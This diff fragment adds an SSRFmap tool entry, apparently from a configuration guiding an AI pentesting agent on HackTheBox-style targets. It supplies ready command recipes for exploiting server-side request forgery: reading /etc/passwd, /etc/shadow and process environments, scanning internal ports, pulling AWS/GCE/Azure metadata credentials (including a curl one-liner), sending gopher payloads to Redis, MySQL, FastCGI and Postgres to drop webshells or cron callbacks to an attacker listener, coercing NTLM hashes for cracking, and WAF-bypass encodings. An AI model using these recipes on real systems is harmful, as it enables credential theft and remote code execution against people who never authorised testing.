+        since the body needs blank-line separator before form data). The parameter VALUE in the request body can be anything
+        (SSRFmap overwrites it with each test payload). For GET-based SSRF use `GET /path?param=PLACEHOLDER HTTP/1.1` and
+        the same -p flag. Agent uses the Write tool for multi-line content with special chars; this Pattern''s heredoc is
+        the inline-string variant. Verify file is well-formed: `cat /session/output/ssrfmap/req.txt | head -10`.'
+    - name: 'Pattern SM1 — readfiles module (default: /etc/passwd, /etc/shadow, /proc/self/environ, etc.)'
+      binary: bash
+      command: -c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt
+        -p <param> -m readfiles --logfile /session/output/ssrfmap/run.log; cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/
+        2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null; ls -la /session/output/ssrfmap/<host>_<port>/
+        2>/dev/null'
+      when: 'Default readfiles iterates 11 common targets: /etc/passwd, /etc/shadow, /etc/lsb-release, /etc/hosts, /proc/self/environ,
+        /proc/self/cmdline, /proc/self/cwd/index.php, /proc/self/cwd/application.py, /proc/self/cwd/main.py, /proc/self/exe
+        (binary). Extracted content lands at /opt/ssrfmap/<host>_<port>/_etc_passwd etc. (via SSRFmap''s diff-based extraction
+        — sends baseline first, then writes diff). Recipe cp''s to /session/output/ssrfmap/ for agent access. Custom file
+        list via `--rfiles ''path1,path2,path3''`. Verified live 2026-05-17 against urllib-based Flask SSRF target: full /etc/passwd
+        + /etc/shadow + /proc/self/exe (10 MB ELF) captured.'
+    - name: Pattern SM2 — portscan / networkscan (internal-network discovery via SSRF)
+      binary: bash
+      command: -c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt
+        -p <param> -m <portscan_or_networkscan> --logfile /session/output/ssrfmap/run.log 2>&1 | sed -E "s/\x1b\[[0-9;]*m//g"'
+      when: 'portscan: tests common ports (21, 22, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 6379,
+        8080, etc.) by trying http://127.0.0.1:PORT/ via the SSRF param. networkscan: same but iterates a subnet. Output is
+        timestamped + ANSI-colored (e.g. `[16:31:39] IP:127.0.0.1, Found <red>filtered</red> port n°443`). Recipe pipes through
+        `sed` to strip ANSI codes for parseable output. Results in stdout (not the cp''d dir since portscan doesn''t extract
+        file content).'
+    - name: Pattern SM3 — cloud metadata (aws / gce / azure / digitalocean / alibaba)
+      binary: bash
+      command: -c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt
+        -p <param> -m <cloud_provider> --logfile /session/output/ssrfmap/run.log; cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/
+        2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null; ls -la /session/output/ssrfmap/<host>_<port>/
+        2>/dev/null'
+      when: 'Per-provider modules: `-m aws` (hits 169.254.169.254/latest/meta-data/iam/security-credentials/ + user-data +
+        public-keys); `-m gce` (hits metadata.google.internal/computeMetadata/v1/?recursive=true); `-m azure` (hits 169.254.169.254/metadata/instance);
+        `-m digitalocean` (hits 169.254.169.254/metadata/v1/); `-m alibaba` (hits 100.100.100.200/latest/meta-data/). Extracted
+        creds land at /opt/ssrfmap/<host>_<port>/iam-security-credentials or user-data etc. — agent reads + extracts AccessKeyId/SecretAccessKey/Token
+        via grep or jq. Major upgrade vs legacy wrapper which lumped all clouds into one `exploit_metadata` method.'
+    - name: Pattern SM4 — gopher-encoded backend service exploitation (redis / mysql / fastcgi / postgres / memcache / smtp
+        / zabbix)
+      binary: bash
+      command: -c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt
+        -p <param> -m <service> --lhost <attacker_tun0> --lport <listener_port> -l http --logfile /session/output/ssrfmap/run.log;
+        cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/
+        2>/dev/null'
+      when: 'Generates and sends gopher://<host>:<port>/_<encoded-protocol-bytes> payloads through the SSRF param. Modules:
+        `-m redis` (gopher to 6379, FLUSHALL+SET+CONFIG SET dir+dbfilename+SAVE for webshell drop OR cron job); `-m mysql`
+        (gopher to 3306, custom SQL via binary auth handshake); `-m fastcgi` (gopher to 9000, FastCGI RCE chain); `-m postgres`
+        (gopher to 5432, COPY FROM PROGRAM); `-m memcache` (gopher to 11211, text protocol injection); `-m smtp` (gopher to
+        25, mail relay); `-m zabbix` (gopher to 10050, agent RCE). --lhost and --lport are CRITICAL for redis/fastcgi — they
+        point the dropped webshell or cron at attacker''s listener. `-l http` starts SSRFmap''s INTERNAL HTTP-handler listener
+        (caveat verified live 2026-05-17: `-l` takes a HANDLER NAME, not a port number — only handler available is `http`;
+        passing `-l 4444` or any other string fails with `[ERROR]:Invalid no such handler: 4444`). For non-HTTP reverse shells,
+        use an EXTERNAL nc listener via the nc tool (set --lhost --lport to the nc listener, omit -l entirely).'
+    - name: Pattern SM5 — smbhash UNC NTLM coercion (pairs with responder)
+      binary: bash
+      command: -c 'mkdir -p /session/output/ssrfmap && python3 /opt/ssrfmap/ssrfmap.py -r /session/output/ssrfmap/req.txt
+        -p <param> -m smbhash --lhost <attacker_tun0> --logfile /session/output/ssrfmap/run.log'
+      when: 'Injects UNC path `\\<attacker_tun0>\share` into the SSRF param — target tries to authenticate to attacker''s
+        SMB share, sending NTLMv2 hash. Must be paired with responder running on attacker (Pattern R3 SMB-only mode): start
+        responder FIRST on the agent (`mcp_tool responder/run_cli` Pattern R3, captures hashes to /session/output/responder/logs/),
+        THEN run this Pattern SM5 — responder captures the NTLMv2 hash for offline crack via hashcat -m 5600. Requires the
+        target''s HTTP-fetcher backend to be Windows-based OR a Linux backend using a library that follows UNC paths (rare
+        but exists in some PHP/Java configurations).'
+    output_formats:
+    - flag: ''
+      format: text
+      preferred: true
+      notes: 'Mixed text output: banner + module-launched message on stdout; verbose log via --logfile FILE (recommended:
+        /session/output/ssrfmap/run.log). For modules with diff-extraction (readfiles, aws, gce, etc.), captured RESPONSE
+        BODIES (the actual extracted file contents) land at /opt/ssrfmap/<host>_<port>/<filename> on disk — recipes cp to
+        /session/output/ssrfmap/. Stdout may contain ANSI escape codes (portscan/networkscan); strip with sed/python before
+        parsing.'
+    common_options:
+      required:
+      - -r REQFILE — raw HTTP request file (Pattern SM0 generates this)
+      - -p PARAM — name of the SSRF-vulnerable parameter (query string, POST body, or header)
+      - '-m MODULE — one of 23 usable modules: alibaba, aws, axfr, consul, custom, digitalocean, docker, fastcgi, gce, github,
+        httpcollaborator, memcache, mysql, networkscan, portscan, postgres, readfiles, redis, smbhash, smtp, socksproxy, tomcat,
+        zabbix. (`template` also exists in /opt/ssrfmap/modules/ but is a skeleton-only template, not a real exploit — `-m
+        template` would load but do nothing useful)'
+      reverse_handler:
+      - '-l http — start SSRFmap''s INTERNAL reverse-shell handler. NOTE: -l takes a HANDLER NAME from /opt/ssrfmap/handlers/,
+        NOT a port number; only `http` is available in this image (live-caught 2026-05-17: -l 4444 fails with ''Invalid no
+        such handler: 4444''). For non-HTTP callbacks, omit -l and use external nc listener via --lhost/--lport'
+      - --lhost HOST — attacker IP for reverse-connection payloads (tun0 IP on HTB; agent's interface IP)
+      - --lport PORT — attacker port for reverse-connection payloads (matches the -l value OR external nc -lvnp port)
+      - --ldomain DOMAIN — for axfr / domain-related modules; the target's domain
+      payload_tuning:
+      - --rfiles 'path1,path2,...' — custom files list for readfiles module (comma-separated)
+      - --level N — WAF-bypass level 1-5 (default 1); effect varies by module — for IP-based modules adds decimal/hex/octal/@-bypass
+        variants; for path-based modules adds URL-encoding variants
+      http_layer:
+      - --ssl — use HTTPS (no cert verification) for the request to the SSRF endpoint itself
+      - --proxy URL — route ssrfmap's HTTP requests through a proxy (e.g., http://127.0.0.1:8080 for Burp inspection during
+        recipe debugging)
+      - --uagent 'STRING' — override User-Agent in the request
+      output:
+      - '--logfile FILE — redirect verbose log to FILE (default: /opt/ssrfmap/SSRFmap.log)'
+      - -v — verbose mode (logs every request payload + response status)
+    gotchas:
+    - 'PATH A FLIP (May 2026): the legacy 597-LOC wrapper was a Python `requests` re-implementation that never invoked the
+      real SSRFmap binary at /opt/ssrfmap/ssrfmap.py. Migration EXPOSES the 24-module real surface vs the wrapper''s 2 effectively-implemented
+      modules (readfiles, portscan). Net gain: aws/gce/azure/digitalocean/alibaba (per-cloud, vs wrapper''s lumped exploit_metadata),
+      redis/mysql/fastcgi/postgres (real binary-protocol gopher generation, vs wrapper''s url_quote stub), smbhash, axfr,
+      consul, docker, socksproxy, tomcat, zabbix, httpcollaborator, networkscan.'
+    - 'REQUEST FILE FORMAT (Pattern SM0): standard raw HTTP request with \r\n line endings. heredoc (`cat <<EOF`) preserves
+      the format. The parameter VALUE in the request body can be anything (SSRFmap rewrites it). For GET-based SSRF: `GET
+      /path?param=PLACEHOLDER HTTP/1.1\r\nHost: target\r\n\r\n`. For POST with form: blank line + body with `param=PLACEHOLDER&other=value`.
+      For POST with JSON: `Content-Type: application/json\r\n\r\n{"param":"PLACEHOLDER"}` (with `-p param`). Verified live
+      2026-05-17 — pyftpdlib-style synthetic Flask target accepted standard heredoc format.'
+    - 'CAPTURED FILES → /opt/ssrfmap/<host_or_host_port>/: SSRFmap''s diff-based extraction writes captured response data
+      (the actual extracted file contents) to a directory NAMED AFTER THE REQUEST FILE''S Host HEADER VERBATIM (colon replaced
+      with underscore), in /opt/ssrfmap REGARDLESS of agent-side cwd. Directory naming varies by Host header format: `Host:
+      forge.htb` → `/opt/ssrfmap/forge.htb/`; `Host: 127.0.0.1:5000` → `/opt/ssrfmap/127.0.0.1_5000/`. Every Pattern recipe
+      MUST include cp post-steps for BOTH forms: `cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null;
+      cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null`. Verified live 2026-05-17: synthetic Flask target
+      (Host: 127.0.0.1:15050) → /opt/ssrfmap/127.0.0.1_15050/ captured /etc/passwd + /etc/shadow + /proc/self/exe (10 MB);
+      HTB Forge target (Host: forge.htb, no port) → /opt/ssrfmap/forge.htb/ confirmed the host-vs-host:port distinction. Gotcha
+      #17 (DIRECTORY NAME DEPENDS ON HOST HEADER FORMAT) overlaps with this — both are kept for clarity.'
+    - 'DIFF-BASED EXTRACTION CAN MISS DYNAMIC RESPONSES: SSRFmap sends a BASELINE request (empty SSRF payload) first, captures
+      baseline body, then for each SSRF test payload computes `diff = response.text - default.text`. If the target''s response
+      body is DYNAMIC (timestamps, randomized error pages, anti-CSRF tokens that change per-request), the diff will contain
+      noise that masks the actual extraction. Mitigation: use --proxy to inspect raw responses in Burp, OR for one-off confirmation
+      use curl directly with a single payload to see the full response body.'
+    - 'ANSI ESCAPE CODES IN STDOUT (portscan, networkscan): SSRFmap colorizes ''filtered''/''open'' status with ANSI codes
+      (\x1b[31m...\x1b[0m). Recipe pipes through `sed -E ''s/\x1b\[[0-9;]*m//g''` to strip codes before agent parsing. Other
+      modules with extraction-to-disk (readfiles, aws, etc.) don''t need this since their data lands in files, not stdout.'
+    - '--level NUMBER (1-5) EFFECT VARIES BY MODULE: not a uniform ''try N more encodings'' — for IP-based modules (readfiles,
+      portscan) it adds decimal-IP / hex-IP / octal-IP / @-bypass variants of 127.0.0.1; for path-based modules it adds URL-encoding
+      variants. Some modules ignore --level entirely. Verified live: --level 1 and --level 5 produced same payload count for
+      readfiles (the module iterates its 11 fixed file paths, not encoding variants).'
+    - '-l HANDLER_NAME vs --level: easy to confuse. `-l` takes a HANDLER NAME, NOT a port number (caught live 2026-05-17:
+      passing `-l 4444` fails with `[ERROR]:Invalid no such handler: 4444`). SSRFmap''s --help example `-l 4242` is MISLEADING
+      — that 4242 only works because no handler is loaded; failing silently. The actual handlers live in /opt/ssrfmap/handlers/;
+      only `http.py` exists in this image, so `-l http` is the ONLY valid form. For non-HTTP callbacks, omit `-l` and use
+      an external nc listener (--lhost --lport pointing at the nc tool). `--level NUMBER` is the WAF-bypass level (separate
+      flag).'
+    - 'REVERSE-HANDLER ALTERNATIVES: for redis/fastcgi/mysql modules, the dropped payload calls back to --lhost:--lport. Two
+      options: (a) `-l <port>` makes SSRFmap itself listen internally (simpler, suitable for one-shot); (b) external `nc`
+      tool listener (more flexible, supports multi-callback debugging, survives if ssrfmap crashes). Cross-tool see_also documents
+      both.'
+    - 'GOPHERUS RETIRED (May 2026): the legacy Dockerfile cloned tarunkant/Gopherus (Python2-only tool) to /opt/gopherus,
+      but Python2 is NOT installed in the image (`python2: command not found`) — Gopherus has never worked in this image.
+      The wrapper never invoked it either. Removed from Dockerfile in the Tier A flip. Gopher payload generation is now handled
+      by SSRFmap''s per-module gopher logic (redis.py, mysql.py, fastcgi.py — all working under Python3).'
+    - 'VERBOSE OUTPUT IS NOISY: -v prints every request payload + response status to stdout, which can be 100+ lines per module
+      run. Recipes redirect via `--logfile /session/output/ssrfmap/run.log` so verbose info goes to file, not stdout. Then
+      agent inspects log: `tail -50 /session/output/ssrfmap/run.log` or `grep -E ''Reading|Writing|Found|Error'' /session/output/ssrfmap/run.log`.'
+    - 'WHEN TO PREFER CURL DIRECTLY: simple one-shot SSRF — agent has a single payload, wants the response body inline. e.g.
+      `curl -d ''url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'' http://target/ssrf` returns
+      the IAM credentials JSON directly. ssrfmap would do the same via -m aws + cp, but adds round-trip complexity. Use ssrfmap
+      when (a) iterating multiple payloads (readfiles'' 11 paths, portscan''s 19+ ports), (b) generating gopher encoding for
+      binary protocols, (c) WAF bypass variants, (d) reverse-shell handler integration.'
+    - 'SMBHASH REQUIRES WINDOWS-FRONTING-BACKEND OR UNC-FOLLOWING LIBRARY: the smbhash module injects `\\attacker\share` into
+      the SSRF parameter. The TARGET''S backend must actually try to fetch that UNC path. Windows IIS/asp.net does; Linux
+      backends only do if using a library that follows UNC (PHP curl with certain flags, some Java libs). Test with smbhash
+      + tcpdump on attacker for incoming SMB packets before trusting it.'
+    - 'CONTAINER MUST BE FRESHLY-SPAWNED OR CWD RESET: the diff-extraction directory naming uses `request_host:port` from
+      the request file — if a previous run left files in /opt/ssrfmap/127.0.0.1_5000/, subsequent runs against the same host:port
+      APPEND/OVERWRITE there. The `cp -rn` flag means ''don''t overwrite existing'', so newer extractions get the new content
+      but old files persist. For clean per-run isolation, agent can `rm -rf /opt/ssrfmap/<host>_<port>/` BEFORE invoking the
+      next Pattern, or use different target host:port between runs.'
+    - 'PROXY FOR DEBUGGING: --proxy http://attacker:8080 routes ALL of ssrfmap''s HTTP traffic through a Burp/mitmproxy listener
+      — agent can spawn a simple mitmdump in a sibling container to capture full request/response bodies including the data
+      ssrfmap''s diff would have missed. Useful when (a) the target''s response is dynamic and diff is broken, (b) confirming
+      WAF bypass behavior, (c) debugging request-file format issues.'
+    - 'EXAMPLE REQUEST FILES BUNDLED: /opt/ssrfmap/examples/ has request.txt / request2.txt / etc. and example.py (a Flask
+      target with /ssrf endpoint for offline testing). Agent can `cat /opt/ssrfmap/examples/request.txt` to see the canonical
+      format reference.'
+    - 'WAF-BYPASS ARSENAL GAP — `--level 5` is IP-encoding-only: SSRFmap''s `--level 1-5` flag generates payload variants
+      targeting IP-based blacklists (decimal `2130706433`, hex `0x7f000001`, octal-IP, @-bypass `http://example.com@127.0.0.1`,
+      IPv6 literals `[::1]`). It does NOT generate CASE-VARIANT hostname variants (LOCALHOST, LocalHost). Targets with case-sensitive
+      lowercase-only blacklists (e.g. HTB Forge blocks literal `localhost`/`127.0.0.1` but allows `LOCALHOST`) DEFEAT the
+      standard arsenal completely — verified live 2026-05-17 against Forge: 3540 payloads from --level 5 portscan, 0 ports
+      found. Workaround: use `-m custom` with hand-crafted payloads, OR fall back to direct curl through the SSRF param (the
+      case-variant bypass is more easily applied in curl than as a SSRFmap module modification).'
+    - 'CAPTURED-FILES DIRECTORY NAME DEPENDS ON HOST HEADER FORMAT: SSRFmap names the extraction directory after the request
+      file''s Host header literally — `Host: forge.htb` → `/opt/ssrfmap/forge.htb/`; `Host: 127.0.0.1:5000` → `/opt/ssrfmap/127.0.0.1_5000/`.
+      The colon-to-underscore replacement happens, but the port is INCLUDED only when the Host header has one. cp post-step
+      should attempt BOTH forms: `cp -rn /opt/ssrfmap/<host>_<port>/ /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/
+      /session/output/ssrfmap/ 2>/dev/null; cp -rn /opt/ssrfmap/<host>/ /session/output/ssrfmap/ 2>/dev/null` to handle both.
+      Verified live 2026-05-17 — Forge request used `Host: forge.htb` (no port) → directory is `forge.htb/` not `forge.htb_80/`.'
+    - 'FORGE-STYLE TARGETS — when SSRFmap CAN''T help: targets that block file:// at protocol filter AND have case-sensitive
+      hostname blacklists (verified live on HTB Forge 2026-05-17) defeat SSRFmap''s stock arsenal: readfiles needs file://
+      (blocked), portscan needs IP-encoded http:// (blocked too because Forge''s filter strips numeric forms via Python requests
+      not parsing them as IPs). For these targets, agent uses direct curl with the case-variant bypass + the chained-SSRF
+      / internal-admin-vhost trick. SSRFmap''s actual sweet spot: cloud-metadata extraction (no file://, just http:// to metadata
+      endpoints) + gopher-encoded backend services + portscan when target permits internal-IP fetches.'
+    failure_signatures:
+    - signal: '[INFO]:Empty response'
+      layer: ssrf
+      remediation: 'SSRFmap sent payloads but got no response data back. Possible causes: (1) SSRF parameter doesn''t actually
+        trigger backend fetch — verify with curl directly that the param accepts URLs; (2) target''s backend fetcher rejects
+        the file:// or http://internal scheme (modern curl with --proto restrictions); (3) target is hardened against SSRF
+        (blocking 127.0.0.1, 169.254.169.254, RFC1918). Try Pattern SM2 portscan first to confirm SSRF DOES reach internal
+        ports, then return to SM1 readfiles.'
+    - signal: Connection refused
+      layer: tcp
+      remediation: 'Target''s BACKEND (the server that fetches the SSRF URL) couldn''t reach the requested resource. For portscan:
+        this IS the expected result for closed ports (filtered/open differentiation). For other modules: the internal service
+        isn''t running (e.g. Redis not at 6379), wrong host (try --lhost adjustments), or the SSRF doesn''t reach that subnet.'
+    - signal: Module 'X' not found
+      layer: config
+      remediation: 'Module name typo or invalid module. Check valid list: alibaba/aws/axfr/consul/custom/digitalocean/docker/fastcgi/gce/github/httpcollaborator/memcache/mysql/networkscan/portscan/postgres/readfiles/redis/smbhash/smtp/socksproxy/template/tomcat/zabbix.
+        Use lowercase. `template` is a module-template skeleton, not a real exploit module.'
+    - signal: 'Error: argument -r/--reqfile: required'
+      layer: args
+      remediation: Missing -r REQFILE flag. Run Pattern SM0 first to write the request file to /session/output/ssrfmap/req.txt,
+        then chain into the next Pattern's recipe.
+    - signal: 'SyntaxError: invalid syntax'
+      layer: parse
+      remediation: 'Request file malformed — likely missing \r\n line endings or missing blank line between headers and body.
+        Re-run Pattern SM0 with heredoc OR Write tool to regenerate. Check: `cat /session/output/ssrfmap/req.txt | head` —
+        should look like standard HTTP request with separator blank line before body.'
+    - signal: 'cp: cannot stat ''/opt/ssrfmap/<host>_<port>/'': No such file or directory'
+      layer: fs
+      remediation: 'The diff-extraction directory wasn''t created — meaning SSRFmap didn''t find any extractable data (empty
+        diff for every payload, target returns same body regardless of SSRF). For readfiles: the target''s backend may be
+        Linux without /etc/passwd-readability OR using a fetcher that rejects file://. For cloud-metadata: target may not
+        be a cloud instance, or metadata IMDSv2 token-required mode is enabled (older SSRFmap doesn''t handle IMDSv2). The
+        cp error is benign — just means no files captured. Recipe uses `2>/dev/null` to swallow it.'
+    help_commands:
+    - name: ssrfmap top-level help
+      binary: python3
+      command: /opt/ssrfmap/ssrfmap.py --help
+      when: Show all CLI flags (-r, -p, -m, -l, --lhost, --lport, --ldomain, --rfiles, --uagent, --ssl, --proxy, --level,
+        --logfile, -v). target=null.
+    - name: ssrfmap module list (filesystem inspection)
+      binary: bash
+      command: -c 'ls /opt/ssrfmap/modules/ | sed "s/.py$//" | grep -v __init__ | tr "\n" " "'
+      when: Print the 24 available modules. target=null.
+    - name: ssrfmap example request file (canonical format reference)
+      binary: cat
+      command: /opt/ssrfmap/examples/request.txt
+      when: Show a working request.txt format that ssrfmap accepts — POST with form-urlencoded body, blank line separator.
+        target=null.
   ssti:
     name: ssti
     kind: cli
